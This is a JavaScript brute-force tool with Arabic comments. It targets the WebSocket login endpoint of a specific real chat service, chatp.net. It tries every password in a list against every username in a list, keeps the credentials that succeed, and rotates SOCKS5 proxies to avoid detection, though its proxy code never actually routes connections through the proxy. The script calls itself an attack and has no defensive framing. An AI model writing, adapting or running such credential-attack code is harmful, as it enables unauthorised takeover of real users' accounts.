// script.js
const SOCKET_URL = "wss://chatp.net:5333/server";

// المتغيرات العامة
let isRunning = false;
let currentProxy = null;
let proxyPool = new Map();
let badProxies = new Set();
let successCounter = 0;
let currentAttempt = 0;
let goodPasswords = new Set();
let badPasswords = new Set();

// تهيئة التطبيق
document.addEventListener('DOMContentLoaded', function() {
    updateStats();
    setupEventListeners();
});

function setupEventListeners() {
    document.getElementById('startBtn').addEventListener('click', startProcess);
    document.getElementById('stopBtn').addEventListener('click', stopProcess);
}

function startProcess() {
    if (!isRunning) {
        isRunning = true;
        updateButtons();
        updateStatus('جاري التشغيل...', 'running');
        log("🚀 بدء عملية Brute Force...");
        
        // بدء العملية الرئيسية
        main().catch(error => {
            log(`❌ خطأ: ${error}`);
            stopProcess();
        });
    }
}

function stopProcess() {
    isRunning = false;
    updateButtons();
    updateStatus('متوقف', 'stopped');
    log("⏹️ تم إيقاف العملية");
}

function updateStatus(message, type = 'ready') {
    const statusElement = document.getElementById('status');
    const statusIcon = statusElement.querySelector('i');
    
    statusIcon.className = 'fas fa-circle';
    statusIcon.classList.add(`status-${type}`);
    
    statusElement.querySelector('span').textContent = message;
}

function updateButtons() {
    document.getElementById('startBtn').disabled = isRunning;
    document.getElementById('stopBtn').disabled = !isRunning;
}

function log(message) {
    const logElement = document.getElementById('log');
    const now = new Date().toLocaleTimeString();
    const logEntry = document.createElement('div');
    logEntry.innerHTML = `<span class="log-time">[${now}]</span> ${message}`;
    logElement.appendChild(logEntry);
    logElement.scrollTop = logElement.scrollHeight;
}

function updateStats() {
    document.getElementById('goodCount').textContent = goodPasswords.size;
    document.getElementById('badCount').textContent = badPasswords.size;
    document.getElementById('attemptCount').textContent = currentAttempt;
    
    document.getElementById('goodPasswords').value = Array.from(goodPasswords).join('\n');
    document.getElementById('badPasswords').value = Array.from(badPasswords).join('\n');
}

function loadProxies() {
    const proxiesText = document.getElementById('proxies').value;
    const proxies = proxiesText.split('\n')
        .filter(line => line.trim() !== '')
        .map(proxy => proxy.trim());

    proxyPool.clear();
    proxies.forEach(proxy => {
        if (!proxy.startsWith('socks5://')) {
            proxy = 'socks5://' + proxy;
        }
        if (!badProxies.has(proxy)) {
            proxyPool.set(proxy, { score: 1, fails: 0 });
        }
    });

    log(`📦 تم تحميل ${proxyPool.size} بروكسي`);
    return proxyPool.size > 0;
}

async function testProxy(proxyUrl) {
    return new Promise((resolve) => {
        const testSocket = new WebSocket(SOCKET_URL);
        const timeout = setTimeout(() => {
            testSocket.close();
            resolve(false);
        }, 10000);

        testSocket.onopen = () => {
            clearTimeout(timeout);
            testSocket.close();
            resolve(true);
        };

        testSocket.onerror = () => {
            clearTimeout(timeout);
            resolve(false);
        };
    });
}

async function getNewProxy() {
    if (proxyPool.size === 0) {
        return false;
    }

    const sortedProxies = Array.from(proxyPool.entries())
        .sort((a, b) => b[1].score - a[1].score);

    for (const [proxy, stats] of sortedProxies) {
        log(`🔍 اختبار البروكسي: ${proxy}`);
        const isWorking = await testProxy(proxy);
        
        if (isWorking) {
            currentProxy = proxy;
            successCounter = 0;
            log(`🌐 استخدام البروكسي: ${proxy} (النقاط: ${stats.score})`);
            return true;
        } else {
            log(`🗑️ البروكسي فشل في الاختبار: ${proxy}`);
            badProxies.add(proxy);
            proxyPool.delete(proxy);
        }
    }

    return false;
}

function createWebSocket(timeout = 30000) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(SOCKET_URL);
        const timeoutId = setTimeout(() => {
            ws.close();
            reject(new Error('انتهت مهلة الاتصال'));
        }, timeout);

        ws.onopen = () => {
            clearTimeout(timeoutId);
            resolve(ws);
        };

        ws.onerror = (error) => {
            clearTimeout(timeoutId);
            reject(error);
        };
    });
}

async function tryLogin(username, password) {
    const timeout = parseInt(document.getElementById('timeout').value) * 1000;
    
    try {
        const ws = await createWebSocket(timeout);
        
        return new Promise((resolve) => {
            ws.onmessage = (event) => {
                const response = event.data;
                const success = response.includes('login_event') && response.includes('"type":"success"');
                
                ws.close();
                
                if (currentProxy && proxyPool.has(currentProxy)) {
                    const stats = proxyPool.get(currentProxy);
                    if (success) {
                        stats.score = Math.min(5, stats.score + 1);
                        stats.fails = 0;
                    } else {
                        stats.fails++;
                        if (stats.fails >= 2) {
                            badProxies.add(currentProxy);
                            proxyPool.delete(currentProxy);
                        } else {
                            stats.score = Math.max(0, stats.score - 1);
                        }
                    }
                }

                successCounter++;
                const rotateEvery = parseInt(document.getElementById('rotateEvery').value);
                if (successCounter >= rotateEvery && proxyPool.size > 1) {
                    log(`🔄 تبديل البروكسي بعد ${rotateEvery} محاولات`);
                    getNewProxy();
                }

                resolve({ connected: true, success });
            };

            // إرسال طلب التسجيل
            const loginData = {
                handler: "login",
                username: username,
                password: password
            };
            ws.send(JSON.stringify(loginData));

            // وقت انتظار للاستجابة
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                }
                resolve({ connected: true, success: false });
            }, 5000);

        });
    } catch (error) {
        if (currentProxy && proxyPool.has(currentProxy)) {
            const stats = proxyPool.get(currentProxy);
            stats.fails++;
            if (stats.fails >= 2) {
                badProxies.add(currentProxy);
                proxyPool.delete(currentProxy);
            }
        }
        return { connected: false, success: false };
    }
}

async function main() {
    const passwords = document.getElementById('passwords').value.split('\n').filter(p => p.trim() !== '');
    const users = document.getElementById('users').value.split('\n').filter(u => u.trim() !== '');
    const delay = parseInt(document.getElementById('delay').value) * 1000;

    if (passwords.length === 0 || users.length === 0) {
        log("❌ يرجى إدخال الباسوردات والحسابات");
        stopProcess();
        return;
    }

    const hasProxies = loadProxies();
    
    if (hasProxies) {
        if (!await getNewProxy()) {
            log("❌ لا توجد بروكسيات شغالة");
        }
    } else {
        log("⚡ التشغيل بدون بروكسي");
    }

    log(`🚀 بدء الهجوم على ${users.length} حساب بـ ${passwords.length} باسورد`);

    for (const password of passwords) {
        if (!isRunning) break;

        let passwordWorked = false;
        const cleanPassword = password.trim();

        for (const user of users) {
            if (!isRunning) break;
            
            const cleanUser = user.trim();
            currentAttempt++;
            updateStats();

            if (hasProxies && !currentProxy) {
                await getNewProxy();
            }

            const result = await tryLogin(cleanUser, cleanPassword);
            
            if (result.connected && result.success) {
                log(`✅ <span style="color: #4cc9f0">نجح! الحساب: ${cleanUser} - الباسورد: ${cleanPassword}</span>`);
                goodPasswords.add(`${cleanUser}:${cleanPassword}`);
                updateStats();
                passwordWorked = true;
                break;
            } else if (result.connected) {
                log(`❌ فشل: ${cleanUser}:${cleanPassword} (المحاولة ${currentAttempt})`);
            } else {
                log(`⚠️ خطأ اتصال: ${cleanUser}:${cleanPassword}`);
            }

            // تأخير بين المحاولات
            await new Promise(resolve => setTimeout(resolve, delay));
        }

        if (!passwordWorked) {
            badPasswords.add(cleanPassword);
            updateStats();
            log(`🗑️ تم إضافة الباسورد للقائمة السوداء: ${cleanPassword}`);
        }
    }

    log("🏁 انتهت العملية");
    stopProcess();
}
